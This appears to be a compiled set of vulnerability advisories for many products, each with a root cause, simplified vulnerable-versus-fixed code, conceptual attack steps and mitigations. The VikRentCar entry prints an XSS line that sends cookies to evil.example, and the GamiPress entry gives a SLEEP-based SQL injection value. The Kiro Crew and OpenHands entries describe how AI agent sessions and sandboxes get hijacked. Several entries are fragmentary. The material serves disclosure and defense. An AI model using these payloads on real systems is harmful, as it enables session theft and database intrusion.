docs.title: CVE-2026-112305 - Semaphore UI: task_runner Role Escalates to Full RCE
docs.text: Field Value Severity High - CVSS 8.8 Product Semaphore UI through 2.19.16 (Ansible automation) Type Improperly Controlled Modification of Object Attributes (CWE-915) Vector Authenticated task_runner user overrides protected Ansible variables through the task environment JSON

docs.title: Affected versions
docs.text: Semaphore UI through 2.19.16.

docs.title: Root cause
docs.text: When launching a task, the environment JSON supplied by the user was merged over the protected Ansible variables without filtering. A low-privilege task_runner could therefore redefine variables the playbook trusts - connection settings, become passwords, module paths - turning an ordinary task run into remote code execution on managed hosts.

docs.title: Proof of concept (conceptual)
docs.text:
The attack chain is:

  1. Attacker holds a low-privilege task_runner account.
  2. They submit a task whose environment JSON redefines protected Ansible variables.
  3. Semaphore merges the attacker keys over the protected set unfiltered.
  4. The playbook runs with attacker-controlled variables: RCE on targets.

The accompanying poc.py demonstrates the pattern safely: a vulnerable mock versus the fixed pattern. Fully offline, synthetic data - no exploit, no network calls.

docs.title: Mitigation
docs.text: Upgrade Semaphore UI past 2.19.16. Audit task histories for environment JSON touching protected Ansible variables. Apply least privilege: few users need the task_runner role on sensitive inventories. Alert on task environment payloads that redefine known protected names.

docs.title: CVE-2026-112312 — ACF Extended: No Login, No Password — Strangers Get the Keys
docs.text: Field Value Severity High — CVSS 7.5 (v3.1) Product ACF Extended — the Advanced Custom Fields power-up plugin for WordPress Type Missing authorization (CWE-862) — restricted action performed without checking the caller Vector Unauthenticated remote attacker calls a restricted endpoint → the action runs without any authorization check → attacker accesses data and triggers behavior meant only for trusted site owners

docs.title: Affected versions
docs.text: ACF Extended from n/a through 0.9.2.7. Fixed in 0.9.2.8.

docs.title: Root cause
docs.text:
A restricted action never asked who is calling. Every sensitive operation needs a gatekeeper that verifies the caller's rights; here the gate was simply missing:

# Simplified vulnerable pattern
def sensitive_action(request):
    return do_restricted_thing(request)   # BUG: no authorization check

# Simplified fixed pattern
def sensitive_action_fixed(request, user):
    if not user.can("manage_options"):    # gatekeeper in place
        return deny()
    return do_restricted_thing(request)
Authentication says who you are; authorization says what you may do. Skipping the second question hands strangers the owner's tools.

docs.title: Proof of concept (conceptual)
docs.text:
1. Attacker, with no account at all, calls the plugin's restricted endpoint.
  2. No authorization check runs — the request is not even asked for credentials.
  3. Data meant for site owners is returned; owner-only behavior is triggered.
  4. Strangers operate the site's machinery from the outside.

The accompanying poc.py demonstrates the pattern safely: every sensitive action needs a gatekeeper: the demo contrasts the unchecked action with one that verifies the caller's rights first. Offline, no server, no exploit.

docs.title: Mitigation
docs.text:
• Upgrade now: ACF Extended 0.9.2.8 or later.
  • Audit your custom fields and any data the endpoint could expose.
  • Tighten user roles — least privilege everywhere.
  • Scan access logs for unauthenticated hits on the affected endpoints.

docs.title: CVE-2026-112327 — Amelia: One Booking Field Cracked the Whole Database
docs.text: Field Value Severity Critical — CVSS 9.3 (v3.1) Product Amelia (by TMS, ameliabooking) — the WordPress appointment booking plugin Type SQL injection (CWE-89) — unsanitized booking input interpolated into a database query Vector Unauthenticated remote attacker submits a booking request with a crafted field value → the value is concatenated into a SQL query → attacker reads, modifies, or deletes the entire database: customer records, user accounts, private data

docs.title: Affected versions
docs.text: Amelia from n/a through 2.4.11. Fixed in 2.4.12.

docs.title: Root cause
docs.text:
A booking input was concatenated straight into a SQL query instead of being passed as a bound parameter. Database queries are structured commands; when attacker text becomes part of the structure, quotes and keywords in it rewrite the command:

# Simplified vulnerable pattern
def find_booking(name):
    query = "SELECT * FROM bookings WHERE name = '%s'" % name  # BUG
    return db.execute(query)   # attacker text is now SQL syntax

# Simplified fixed pattern
def find_booking_fixed(name):
    return db.execute("SELECT * FROM bookings WHERE name = ?", (name,))
    # value stays data, never becomes code
Parameterized queries keep values as data. String concatenation turns user input into query logic — the classic recipe for SQL injection.

docs.title: Proof of concept (conceptual)
docs.text:
1. Attacker opens Amelia's booking form — no account needed.
  2. Attacker types SQL metacharacters into an ordinary booking field.
  3. The plugin pastes the input into its database query, bending the query's meaning.
  4. Attacker extracts customer records and credentials, alters data, or drops tables — the whole database answers.

The accompanying poc.py demonstrates the pattern safely: user input must stay data, never become query syntax: the demo contrasts string-concatenated SQL with parameterized queries. Offline, no server, no exploit.

docs.title: Mitigation
docs.text:
• Upgrade now: Amelia 2.4.12 or later.
  • Audit the database for tampering: unexpected rows, altered permissions, rogue admin accounts.
  • Rotate database credentials and restore anything corrupted from clean backups.
  • Search web logs for booking requests carrying SQL syntax during the exposure window.

docs.title: CVE-2026-112330 / CVE-2026-112331 / CVE-2026-112332 — Motor.NET: Three Malformed-Message Paths to Permanent Crash
docs.text: Field Value Severity High — CVSS 7.5 each (CVSS 4.0: 8.7 each) Product Motor.NET — GDATA's .NET library for consuming RabbitMQ/Kafka messages with CloudEvents, before 0.19.0 Type Unhandled exceptions on malformed input → permanent denial of service (crash loop via redelivery) Vector A single malformed message crashes the consumer three different ways: (a) crafted CloudEvents headers on a RabbitMQ queue, (b) a Kafka record missing required CloudEvent attributes, (c) structurally valid JSON that doesn't match the handler type

docs.title: Affected versions
docs.text: Motor.NET before 0.19.0. Fixed in 0.19.0.

docs.title: Root cause
docs.text:
Message consumers must treat every incoming message as hostile: validate first, catch everything. Motor.NET did neither on three intake paths, so parsing errors escape the handlers entirely — and message queues redeliver what killed you. Uncaught exceptions plus at-least-once delivery is a permanent outage machine.

The three crash paths:

  • CVE-2026-112330 — RabbitMQ: crafted CloudEvents headers (invalid cloudEvents:motorversion, a lone double-quote header value, or an unparsable cloudEvents:time) trigger a fatal unhandled exception.
  • CVE-2026-112331 — Kafka: a record with content-type application/cloudevents+json but missing required attributes (id, source, type) triggers a fatal ArgumentException that stops the host — and the message is then re-processed.
  • CVE-2026-112332 — structurally valid JSON that doesn't match the handler type raises a JsonSerializationException nobody catches, killing the consumer.
# Simplified vulnerable pattern
def consume(message):
    event = parse_cloud_event(message)   # may throw on all three paths
    handle(event)                        # never reached

# Simplified fixed pattern
def consume_fixed(message):
    try:
        event = validate_and_parse(message)  # schema-checked first
    except BadMessage:
        dead_letter(message)                  # quarantined, never redelivered
        return
    handle(event)

docs.title: Proof of concept (conceptual)
docs.text:
1. Attacker publishes one malformed message to the RabbitMQ queue or Kafka topic.
  2. Path A: poisoned CloudEvents headers → fatal unhandled exception.
  3. Path B: missing id/source/type → fatal ArgumentException, host stops, message re-processes.
  4. Path C: right JSON, wrong shape → uncaught serialization error.
  5. The poisoned message is still queued → restart → re-process → crash again. One message, sent once, keeps the consumer down permanently.

The accompanying poc.py demonstrates the pattern safely: a validate-then-catch message pipeline vs. a raw-parse pipeline, using synthetic in-memory messages. No broker, no network, no exploit.

docs.title: Mitigation
docs.text:
• Upgrade Motor.NET to 0.19.0, which closes all three crash paths.
  • Validate message shape (schema-check) before handlers ever see it.
  • Catch parsing failures in error handling that cannot be skipped.
  • Dead-letter poison messages instead of letting them replay forever.

docs.title: CVE-2026-112342 — Tandoor Recipes: Cross-Space Permission Cache Poisoning Grants Stale Admin Rights
docs.text: Field Value Severity High — CVSS 7.1 (v3.1 / v4.0) Product Tandoor Recipes (self-hosted recipe manager) — before 2.7.0 Type Incorrect authorization (CWE-863) — permission cache keyed on user id only Vector Authenticated attacker creates their own space (becoming its admin) → switches active space to a victim space where they hold lesser privileges → the permission cache in cookbook/helper/permission_helper.py is keyed only on user id, omitting the active space, with TTL refreshed on every request → the stale cached admin decision authorizes elevated access in the victim space → bypasses group revocations and demotions across multiple permission classes and views

docs.title: Affected versions
docs.text: Tandoor Recipes before 2.7.0. Fixed in 2.7.0 (commit 1285f5009aa166c0d6f8658849eed5686294d5e9).

docs.title: Root cause
docs.text: The permission cache collapsed two dimensions into one key. Authorization decisions depend on (user, space), but the cache key carried only the user id — so an admin decision made in the attacker's own space was replayed verbatim in every other space they visited. Worse, the entry's TTL was refreshed on each request, so the stale decision never expired while the attacker stayed active. Cache keys must carry every dimension the underlying decision depends on, and cached authorization must not be refreshed indefinitely by the party it authorizes.

docs.title: Proof of concept
docs.text:
The vulnerable pattern, simplified:

# VULNERABLE - cache key omits the active space
def has_admin(user, space):
    key = f"perms:{user.id}"              # space missing!
    if key in cache: return cache[key]    # TTL refreshed each request
    decision = check_groups(user, space)
    cache[key] = decision
    return decision

# FIXED - key carries the full authorization context
def has_admin(user, space):
    key = f"perms:{user.id}:{space.id}"
    ...

The demo poc.py reproduces the stale-decision replay with synthetic users, spaces and groups — no real app, no network.

Educational material only. Do not use against systems you do not own or have explicit permission to test.

docs.title: Mitigation
docs.text: Upgrade to Tandoor Recipes 2.7.0 or later. After upgrading, review group memberships and space roles for unexpected admins — a prior exploitation may have left unauthorized changes behind. As a general practice, include every authorization dimension in cache keys and bound cache lifetimes.

docs.title: CVE-2026-112346 — OpenHands Software Agent SDK unauthenticated sandbox RCE
docs.text: Educational writeup only. The proof of concept below is conceptual and demonstrates the configuration flaw in a controlled lab. Do not use it against systems you do not own.

docs.title: Summary
docs.text: Field Value Severity CRITICAL 9.8 (CVSS v3.1) Product OpenHands Software Agent SDK (before 1.52.0) Type Unauthenticated remote code execution / improper access control Vector Network — exposed sandbox agent server port CWE CWE-1327 (binding to an unrestricted IP address) Fixed in 1.52.0

docs.title: Affected versions
docs.text: OpenHands Software Agent SDK before 1.52.0, when using the DockerWorkspace or Apptainer workspace launchers.

docs.title: Root cause
docs.text: The workspace launchers bind the sandbox agent server to all network interfaces (0.0.0.0) and ship with an empty session_api_keys list. With no keys configured, authentication is disabled by default, so anyone who can reach the published container port can send HTTP and WebSocket requests straight to the agent server — no login, no token.

docs.title: Proof of concept (conceptual, educational only)
docs.text:
See poc.py. It shows, against your own lab container only:

  1. How to check whether a sandbox port is exposed and unauthenticated (a request with no credentials that the server should reject).
  2. The vulnerable configuration pattern (bind-all + empty key list) versus the fixed pattern (localhost-only bind + required API keys).
  3. What an attacker gains once the server answers without auth: arbitrary shell commands as root in the sandbox, the mounted workspace, and plaintext secrets from the secrets store.

No working exploit is provided — only the configuration check and the vulnerable-vs-fixed pattern.

docs.title: Mitigation
docs.text:
• Update the OpenHands Software Agent SDK to 1.52.0 or later.
  • Configure session_api_keys and require authentication on the agent server.
  • Bind the sandbox server to localhost only; never publish sandbox ports to the public internet.
  • Put sandbox hosts behind a firewall and restrict who can reach them.
  • Rotate any secrets that may have been exposed through an open sandbox.
  • Audit containers for sessions you do not recognize.

docs.title: Sunhillo SureLine: No Login Needed to Become Root
docs.text:
Educational material only. Do not use against systems you do not own or have explicit permission to test.

Field Value CVE CVE-2026-112352 Severity Critical - CVSS 9.1 (lead CVE of a Sunhillo SureLine batch) Product Sunhillo SureLine (aviation surveillance / radar data system) Type Authentication bypass (CWE-565) via forged session cookie; batch siblings: OS command injection (CWE-78) and path traversal Vector An unauthenticated remote attacker forges a session cookie containing only a cleartext username (for example Admin or sftp_user). The login check accepts the username with no random identifier or integrity protection, opening a web session. From that session the network diagnostics endpoint runs ping, nslookup, or traceroute as root, and URL-encoded separators slip past its character denylist, giving arbitrary command execution as root.

docs.title: Affected versions
docs.text: Sunhillo SureLine before 9.1.5. Update to 9.1.5 or later.

docs.title: Root cause
docs.text:
A username is a label, not proof of identity. When a session cookie carries only a username and the login check trusts it without a random, signed token, anyone who can guess a name can claim the session:

# Simplified vulnerable pattern
def check_login(cookie):
    if cookie.username in known_users:  # BUG: name alone = proof
        return grant_session(cookie.username)

# Simplified fixed pattern
def check_login_fixed(cookie):
    if valid_signed_token(cookie.token):  # random, integrity-protected
        return grant_session(cookie.username)
    return deny("invalid session")
The diagnostics flaw then converts that fake session into root: a privileged helper that runs shell tools on attacker-shaped input without strict allow-listing becomes a command-execution primitive.

docs.title: Proof of concept
docs.text:
Educational, conceptual demo only - it models the vulnerable pattern with synthetic, offline objects. It is not a working exploit and cannot be aimed at real systems.

  1. Attacker sends a request with a cookie that simply names a known account.
  2. The login check accepts the username and opens a session.
  3. From the session, the attacker calls the diagnostics endpoint with a crafted address field.
  4. Encoded separators split the command, and the tool runs it as root.

The demo in poc.py shows that a username cookie proves nothing without a random signed token, and a privileged diagnostics helper must never run attacker-shaped input through a shell

docs.title: Mitigation
docs.text:
• Update now: SureLine to 9.1.5 or later.
  • Invalidate all active web sessions after patching.
  • Rename default accounts such as Admin and sftp_user.
  • Restrict the web console to trusted hosts and never expose it to the internet.
  • Audit logs for forged sessions and unexpected root commands.

docs.title: CVE-2026-112359 — WPMobile.App: Broken Access Control Exposes App Functions
docs.text: Field Value Severity High — CVSS 7.5 (v3.1) Product WPMobile.App (wpappninja) — WordPress plugin that turns sites into mobile apps Type Missing authorization (CWE-862) — incorrectly configured access control levels Vector Low-privilege or unauthenticated user calls a plugin endpoint directly → the handler never checks the caller's capabilities → restricted app-management functions run for the wrong user

docs.title: Affected versions
docs.text: WPMobile.App from n/a through 11.86. Fixed in versions after 11.86.

docs.title: Root cause
docs.text: Sensitive handlers in the plugin execute without verifying the current user's role or capability. WordPress provides current_user_can() checks for exactly this; when a handler skips them, any visitor who knows the endpoint URL can invoke privileged behavior.

docs.title: Proof of concept
docs.text:
The vulnerable pattern, simplified:

// VULNERABLE - no capability check
add_action('wp_ajax_ninja_action', function () {
    do_privileged_thing($_POST);   // runs for ANY logged-in user
});

// FIXED - verify capability first
add_action('wp_ajax_ninja_action', function () {
    if (!current_user_can('manage_options')) { wp_die('forbidden'); }
    do_privileged_thing($_POST);
});

Broken access control is consistently a top web risk because the flaw is invisible: the endpoint works perfectly - it just never asks who is calling.

Educational material only. Do not use against systems you do not own or have explicit permission to test.

docs.title: Mitigation
docs.text: Update WPMobile.App past 11.86. Review user accounts for unexpected privilege changes and audit recent plugin activity for direct endpoint calls.

docs.title: CVE-2026-112362 — @fastify/express skips auth middleware on scoped routes via absolute-form requests
docs.text: Educational writeup only. The proof of concept below is conceptual and demonstrates the flaw in a controlled lab. Do not use it against systems you do not own.

docs.title: Summary
docs.text: Field Value Severity CRITICAL 9.1 (CVSS v3.1) Product @fastify/express (Fastify plugin that runs Express middleware inside Fastify) Type Authentication / authorization bypass via path handling (CWE-436) Vector Network — unauthenticated, no user interaction CWE CWE-436 (interpretation conflict) Fixed in 4.0.9

docs.title: Affected versions
docs.text: @fastify/express versions 4.0.5 through 4.0.8, when Fastify runs with the non-default ignoreDuplicateSlashes option enabled. Fixed in 4.0.9.

docs.title: Root cause
docs.text: With duplicate-slash collapsing enabled, the plugin matches path-scoped Express middleware against a URL whose duplicate-slash normalization has also collapsed the separator after an absolute-form request target's scheme. Fastify's router therefore resolves the request to the scoped path and runs the handler, while the Express layer no longer sees that path — so middleware for authentication, authorization, or rate limiting that was scoped to that path never runs. Two layers disagreed about the same request, and the guard only protects what it recognizes.

docs.title: Proof of concept (conceptual, educational only)
docs.text:
See poc.py. It shows, against your own lab deployment only:

  1. How to test whether a protected route answers an absolute-form request without the scoped login middleware running.
  2. The vulnerable pattern (guard matched on a normalized path view that differs from the router's view) versus the fixed pattern (updated plugin, default slash handling, auth enforced after routing).
  3. What a successful attack gains: unauthenticated access to protected handlers, with authorization and rate limiting skipped.

No working exploit is provided — only the path-view check and the vulnerable-vs-fixed pattern.

docs.title: Mitigation
docs.text:
• Update @fastify/express to 4.0.9 or later.
  • Leave ignoreDuplicateSlashes at its default (disabled) unless you have verified every scoped middleware still matches.
  • Enforce authentication in a Fastify hook such as preHandler that runs after the router resolves the request, not only in path-scoped Express middleware.
  • Test protected routes with absolute-form requests and audit logs for requests that reached handlers without their guards.

docs.title: CVE-2026-112366 — Picomatch: ReDoS in Extglob Analysis (Event-Loop Denial of Service)
docs.text: Field Value Severity High — CVSS 7.5 (CVSS 3.1) Product picomatch (Node.js glob matching library) Type Inefficient Regular Expression Complexity / ReDoS (CWE-1333) Vector Through 4.0.7, analyzeRepeatedExtglob in lib/parse.js skips single-branch repeated extglob patterns like +(*) or +(*a) — a crafted glob causes exponential backtracking against a short string and blocks the Node.js event loop; unauthenticated DoS

docs.title: Affected versions
docs.text: picomatch through 4.0.7. Fixed by updating past 4.0.7.

docs.title: Root cause
docs.text: analyzeRepeatedExtglob is meant to detect repeated extglob constructs that compile into catastrophic regexes, but it skips single-branch patterns such as +(*) or +(*a). A crafted glob of that form compiles into a regular expression with nested quantifiers; matching it against a short input triggers exponential backtracking. Because it runs on the Node.js event loop, one request stalls every other connection — a cheap, unauthenticated DoS against anything that compiles untrusted globs.

docs.title: Proof of concept (conceptual)
docs.text:
The attack chain is:

  1. Attacker sends input containing a single-branch repeated extglob like +(*).
  2. The app compiles the glob into a regex — the dangerous pattern was skipped by the analyzer.
  3. Matching backtracks exponentially on a short string.
  4. The event loop blocks; the whole Node process stops responding.

The accompanying poc.py demonstrates the pattern safely: a vulnerable mock versus the fixed pattern. Fully offline, synthetic data — no exploit, no network calls.

docs.title: Mitigation
docs.text: Upgrade picomatch past 4.0.7; rebuild lockfiles so the fix propagates. Cap the length and complexity of globs built from untrusted input. Isolate glob compilation in worker threads or timeouts if you cannot upgrade yet.

docs.title: CVE-2026-112368 — MongoDB PHP Driver: Uncontrolled Recursion in BSON Decoding
docs.text: Field Value Severity High — CVSS 7.5 (CVSS 3.1) Product MongoDB PHP driver (mongodb extension) Type Uncontrolled Recursion (CWE-674) Vector The BSON decoding logic recurses without depth control — an unauthenticated party supplying a crafted binary document can exhaust the process stack and terminate the PHP process; the crash happens below the PHP layer and cannot be intercepted by application-level error handling

docs.title: Affected versions
docs.text: mongodb PHP extension, versions with the unbounded BSON decode recursion. Fixed upstream (PHPC-276) — update the driver.

docs.title: Root cause
docs.text: Decoding a BSON document is recursive: each nested document or array adds a frame. The decoder placed no limit on nesting depth, so a document crafted with deep nesting grows the C stack until the PHP process dies. Because the crash occurs in native code below the PHP layer, try/catch, shutdown functions and error handlers cannot intercept it — one crafted binary document is enough to kill the worker.

docs.title: Proof of concept (conceptual)
docs.text:
The attack chain is:

  1. Attacker supplies a crafted binary document with extreme nesting depth.
  2. The app hands it to the BSON decoder.
  3. Decoding recurses without a depth limit — stack frames pile up.
  4. The process exhausts its stack and terminates; PHP-level error handling never fires.

The accompanying poc.py demonstrates the pattern safely: a vulnerable mock versus the fixed pattern. Fully offline, synthetic data — no exploit, no network calls.

docs.title: Mitigation
docs.text: Update the mongodb PHP extension to the fixed release (upstream PHPC-276). Restart PHP workers after upgrading to pick up the fixed native code. Validate document sources — only accept binary documents from trusted producers.

docs.text: H3C Magic NX15 firmware V100R017.

docs.text: The sub_416874 function in /usr/bin/usrlist concatenated request-controlled input into a shell command without sanitization. A remote attacker could inject arbitrary OS commands that executed as root on the router. A public proof of concept exists.

docs.title: CVE-2026-112379 — Contact Form Email: This Message Bites Back When You Read It
docs.text: Field Value Severity High — CVSS 7.1 (v3.1) Product Contact Form Email (by Codepeople) — the WordPress contact-form plugin Type Stored cross-site scripting (CWE-79) — poisoned message rendered as HTML for the site owner Vector Attacker submits a contact-form message carrying script markup → the message is stored and later rendered as live HTML when the site owner reads it → the script runs in the owner's session → session theft, admin takeover

docs.title: Affected versions
docs.text: Contact Form Email from n/a through 1.3.68. Fixed in 1.3.69.

docs.title: Root cause
docs.text:
A contact-form message was stored verbatim and later rendered as HTML in the site owner's message view. The owner's own inbox became the delivery mechanism for a script that runs with the owner's privileges:

# Simplified vulnerable pattern
def save_message(text):
    db.save(text)                      # BUG: stored raw
def owner_inbox():
    return "<div>%s</div>" % db.get()  # BUG: rendered as HTML

# Simplified fixed pattern
def save_message_fixed(text):
    db.save(strip_markup(text))        # neutralize on the way in
def owner_inbox_fixed():
    return "<div>%s</div>" % escape(db.get())  # encode on the way out
A message you only read should never be able to run. Anything rendered into a privileged page must be encoded for that context.

docs.title: Proof of concept (conceptual)
docs.text:
1. Attacker fills in the site's contact form with a message containing script markup.
  2. Contact Form Email stores the message exactly as sent.
  3. The site owner opens the message in their dashboard.
  4. The markup executes as live script in the owner's session — stealing it and the site with it.

The accompanying poc.py demonstrates the pattern safely: reading a message must never execute it: the demo contrasts raw storage and rendering with stripping plus output encoding. Offline, no server, no exploit.

docs.title: Mitigation
docs.text:
• Upgrade now: Contact Form Email 1.3.69.
  • Scan stored messages for script tags and suspicious markup; delete the poisoned ones.
  • Rotate admin credentials and revoke sessions.
  • Encode on output wherever user content meets a privileged page.

docs.title: Kiro Crew: A WhatsApp Group Message Hijacks Agent Sessions and the Host
docs.text: Field Value Severity Critical — CVSS 9.9 (v3.1) Product Kiro Crew before 0.7.2 (AI agent crew with a WhatsApp group channel) Type Missing authorization (CWE-862) — group channel messages not tied to the operator Vector Remote actor who is a member of the operator-configured WhatsApp group sends messages → Kiro Crew routes them into the operator's other agent sessions → arbitrary commands execute on the host running Kiro Crew

docs.title: Affected versions
docs.text: Kiro Crew before 0.7.2. Fixed in 0.7.2.

docs.title: Root cause
docs.text:
The WhatsApp group channel delivers messages into agent sessions without verifying the sender is the operator. Group membership alone — which the operator cannot fully control once a member invites others — is treated as authority over every session and, through them, the host:

# Simplified vulnerable pattern
def on_group_message(msg):
    if msg.group_id == OPERATOR_GROUP:      # membership is the only check
        route_to_session(OPERATOR_SESSION, msg)   # operator's live session!

# Simplified fixed pattern
def on_group_message_fixed(msg):
    if not verify_operator(msg.sender):    # cryptographic sender identity
        return "rejected: sender is not the operator"
    route_to_session(OPERATOR_SESSION, msg)
A chat app message becomes remote code execution on your machine.

docs.title: Proof of concept (conceptual)
docs.text:
1. Attacker is (or becomes) a member of the operator's WhatsApp group.
  2. They send a crafted message to the group.
  3. Kiro Crew routes it into the operator's other agent sessions without a sender check.
  4. The agent executes it — arbitrary commands on the host running Kiro Crew.

docs.title: CVE-2026-112390 — Pillow: Infinite Loop on Crafted MIC Images (DoS)
docs.text: Field Value Severity High — CVSS 8.2 (CVSS 4.0) Product Pillow (Python imaging library) Type Resource Exhaustion / Infinite Loop (CWE-835) Vector Applications reading n_frames or saving all frames of a crafted MIC file pin a worker at 100% CPU forever

docs.title: Affected versions
docs.text: Pillow 7.2.0 until 13.0.0. Fixed in 13.0.0.

docs.title: Root cause
docs.text: MicImageFile inherits TIFF frame traversal, but its tell() reports the OLE stream index while seek() resets TIFF frame state — so an embedded TIFF with at least three IFDs never advances. Reading n_frames or saving all frames of a crafted MIC file loops forever, pinning a worker at full CPU. A frame counter that can never reach its end.

docs.title: Proof of concept (conceptual)
docs.text:
The attack chain is:

  1. Attacker uploads a crafted MIC file with a 3+ IFD embedded TIFF.
  2. App calls n_frames or saves all frames (with olefile installed).
  3. Frame traversal never advances.
  4. Worker pinned at 100% CPU indefinitely.

The accompanying poc.py demonstrates the pattern safely: a vulnerable mock versus the fixed pattern. Fully offline, synthetic data — no exploit, no network calls.

docs.title: Mitigation
docs.text: Upgrade to Pillow 13.0.0 immediately. Process untrusted images in sandboxed workers with CPU timeouts. Validate uploads before frame operations.

docs.text: Field Value Severity High — CVSS 9.2 (CVSS 4.0) Product Pillow (Python imaging library) Type Heap Buffer Overflow (CWE-122) Vector Crafted TIFF with out-of-line tag or ICC profile overflows the heap when saved to BytesIO; stale heap leaks into outputs >64 KiB

  2. App saves it to a BytesIO object.

docs.title: CVE-2026-112408 — SageMaker SDK Default Bucket Ownership Bypass
docs.text: Severity Product Type Attack vector CRITICAL (CVSS 9.4) Amazon SageMaker Python SDK Missing verification of source of a communication channel (CWE-940) Network — remote, no privileges required

docs.title: Summary
docs.text:
The default_bucket() function in the Amazon SageMaker Python SDK generated a predictable S3 bucket name (derived from region + AWS account ID) and used it without verifying that the caller's account actually owned it. An attacker who pre-created that bucket name in their own AWS account could receive training scripts and artifacts uploaded by a victim's SageMaker jobs — and get code execution inside the SageMaker execution environment plus IAM role credentials.

Disclosed by AWS (security bulletin 2026-142-aws); reported by Dan Gansel (Upwind Security) via coordinated disclosure.

docs.title: Root cause
docs.text:
The SDK derived the default bucket name deterministically and treated the name as proof of ownership. S3 bucket names are globally unique but first-come-first-served — nothing stops another AWS account from registering the exact name the SDK will compute for you. Because default_bucket() never compared the bucket's actual owner account against the session's account, the SDK would happily upload job artifacts (training scripts, configs, lifecycle scripts) to a stranger's bucket. Anything that lands in the bucket — and anything the execution environment runs from it — becomes attacker-controlled.

In short: a name is not an identity. The fixed SDK verifies bucket ownership (owner account) before use and rejects buckets owned by someone else.

docs.title: Proof of concept (conceptual — educational only)
docs.text:
Disclaimer: This is an educational illustration of the trust pattern, not a working exploit. It performs no network access and attacks nothing.

The vulnerable logic reduces to this pattern:

def default_bucket_vulnerable(session):
    # name derived from predictable values
    name = "sagemaker-%s-%s" % (session.region, session.account_id)
    if not bucket_exists(name):
        create_bucket(name)            # creates it if missing...
    return name                          # ...but NEVER checks who owns it

The attack steps, conceptually:

  1. Attacker computes the victim's default bucket name (region + account ID are often knowable).
  2. Attacker creates that bucket in their own AWS account.
  3. Victim's SDK, seeing the bucket "exists", uses it without an ownership check.
  4. Victim's training job uploads scripts/artifacts into the attacker's bucket; the execution environment consumes attacker-influenced content → code execution + IAM credential theft.

The fix pattern:

def default_bucket_fixed(session):
    name = "sagemaker-%s-%s" % (session.region, session.account_id)
    if not bucket_exists(name):
        create_bucket(name)
    assert get_bucket_owner(name) == session.account_id   # ownership verified
    return name

docs.title: Mitigation
docs.text:
1. Update immediately — SageMaker Python SDK 3.10.0 (V3) or 2.257.3 (V2).
  2. Workaround (if you cannot upgrade): pass a bucket your account owns explicitly via the default_bucket parameter of sagemaker.Session, or via the SageMaker SDK configuration file. Never rely on the auto-generated default bucket name.
  3. Rotate credentials used by jobs that ran on vulnerable SDK versions (execution-role session credentials, any keys materialized in training outputs).
  4. Audit CloudTrail for unexpected access to your default buckets and review any forks/derivative code for the same pattern.

docs.title: CVE-2026-112770 — Craft CMS: Authenticated RCE via Twig group Filter
docs.text: Field Value Severity High — CVSS 8.8 Product Craft CMS Type Code Injection / Remote Code Execution (CWE-94) Vector Authenticated Control Panel users invoke an array-callable through element-select condition rules to write a web shell

docs.title: Affected versions
docs.text: Craft CMS 4.x before 4.18.8 and 5.x before 5.11.0. Fixed in 4.18.8 / 5.11.0.

docs.title: Root cause
docs.text: Twig's group filter invokes non-string arrow arguments as callables without the checkArrow guard used by every other arrow-accepting filter. An authenticated user passes an array-callable such as FileHelper::writeToFile through an element-select condition rule, and the template engine executes it — a missing guard on one filter out of many. Part of a six-bug Craft CMS sandbox-escape drop (see the video).

  1. Attacker logs in to the Control Panel.
  2. Crafts an element-select condition rule carrying an array-callable.
  3. The group filter invokes it with no sandbox check.
  4. A PHP web shell is written to the web root; attacker opens it in a browser.
  5. Arbitrary commands execute as the web-server user.

The accompanying poc.py demonstrates the pattern safely: a vulnerable mock versus the fixed pattern. Fully offline, synthetic data — no exploit, no network calls.

docs.text: Field Value Severity Critical — CVSS 9.8 Product grav-plugin-api (Grav CMS) Type Resource Exhaustion (CWE-770) Vector Unauthenticated attackers send small requests that each cache ~560 KB, exhausting disk or APCu

  4. Disk/APCu fills; the site stops responding.

docs.title: CVE-2026-112835 — VikRentCar: Reflected XSS in the Car Rental Plugin
docs.text: Field Value Severity High — CVSS 7.1 (v3.1) Product VikRentCar — WordPress car-rental booking plugin by e4jvikwp Type Cross-site scripting, reflected (CWE-79) Vector Attacker crafts a malicious link containing a script payload → victim clicks it → the plugin reflects the input into the page without encoding → the script runs in the victim's browser (session theft, admin actions)

docs.title: Affected versions
docs.text: VikRentCar from n/a through 1.4.8. Fixed in versions after 1.4.8.

docs.title: Root cause
docs.text: User input from the request is echoed into HTML output without output encoding. The browser cannot tell the site's markup from the attacker's markup, so the injected script executes with the victim's session.

docs.title: Proof of concept
docs.text:
The vulnerable pattern, simplified:

// VULNERABLE - raw input reflected into HTML
echo "<div>Search results for: " . $_GET['q'] . "</div>";
// attacker link: ?q=<script>fetch('https://evil.example?c='+document.cookie)</script>

// FIXED - encode on output
echo "<div>Search results for: " . esc_html($_GET['q']) . "</div>";

Reflected XSS needs the victim to click, but one convincing message to an administrator is often enough for a full takeover.

Educational material only. Do not use against systems you do not own or have explicit permission to test.

docs.text: Update VikRentCar past 1.4.8. This plugin carries two XSS flaws disclosed together (this reflected one and CVE-2026-112838 stored XSS) - one update fixes both.

docs.title: CVE-2026-112837 — GamiPress: Blind SQL Injection in the Points Plugin
docs.text: Field Value Severity High — CVSS 8.5 (v3.1) Product GamiPress — WordPress gamification plugin (points, badges, leaderboards) Type Improper neutralization of SQL elements (CWE-89) — blind SQL injection Vector Unauthenticated attacker sends a crafted request to a GamiPress endpoint → user input is glued directly into a SQL query → the database runs the injected SQL → data is extracted bit-by-bit through timing side-channels (a delay means 'yes')

docs.title: Affected versions
docs.text: GamiPress from n/a through 8.0.7. Fixed in versions after 8.0.7.

docs.title: Root cause
docs.text: A database query in the plugin is assembled with string concatenation: user-controlled input is pasted straight into SQL text. The database cannot distinguish the developer's query from the attacker's fragment, so it executes both. Because the injection is blind (no error output), extraction happens through boolean/timing inference.

docs.title: Proof of concept
docs.text:
The vulnerable pattern, simplified:

// VULNERABLE - input glued into SQL
$query = "SELECT * FROM wp_gamipress WHERE user_id = " . $_GET['user_id'];
// attacker sends: 1 OR SLEEP(5)--
// the database sleeps 5s when the injected condition is true -> bit leaks

// FIXED - parameterized query
$stmt = $wpdb->prepare("SELECT * FROM wp_gamipress WHERE user_id = %d", $user_id);

An attacker automates yes/no questions ("is the first character of the admin hash 'a'?") and measures response time, rebuilding the wp_users table - including password hashes - for offline cracking.

docs.title: CVE-2026-112838 — VikRentCar: Stored XSS Hits Every Visitor
docs.text: Field Value Severity High — CVSS 7.1 (v3.1) Product VikRentCar — WordPress car-rental booking plugin by e4jvikwp Type Cross-site scripting, stored (CWE-79) Vector Attacker saves a script payload in a booking or listing field → the payload is stored in the database → every page that renders the field executes the script → visitors and administrators are compromised on view

docs.title: Affected versions
